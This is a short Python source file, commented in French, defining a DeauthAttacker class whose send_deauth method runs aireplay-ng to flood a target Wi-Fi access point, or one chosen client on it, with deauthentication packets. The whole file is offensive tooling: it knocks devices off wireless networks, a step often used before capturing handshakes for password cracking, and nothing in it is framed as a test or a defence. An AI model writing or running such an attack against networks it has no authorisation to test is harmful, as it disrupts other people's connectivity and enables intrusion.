import subprocess
import threading

class DeauthAttacker:
    """Execute des attaques de désauthentification"""
    
    def __init__(self, interface: str):
        self.interface = interface
        
    def send_deauth(self, target_bssid: str, client_bssid: str = None, count: int = 10):
        """Envoie des paquets de désauthentification"""
        try:
            cmd = ["aireplay-ng", "--deauth", str(count)]
            
            if client_bssid:
                cmd.extend(["-c", client_bssid])
                
            cmd.extend(["-a", target_bssid, self.interface])
            
            subprocess.run(cmd, capture_output=True)
            
        except Exception as e:
            print(f"❌ Erreur deauth: {e}")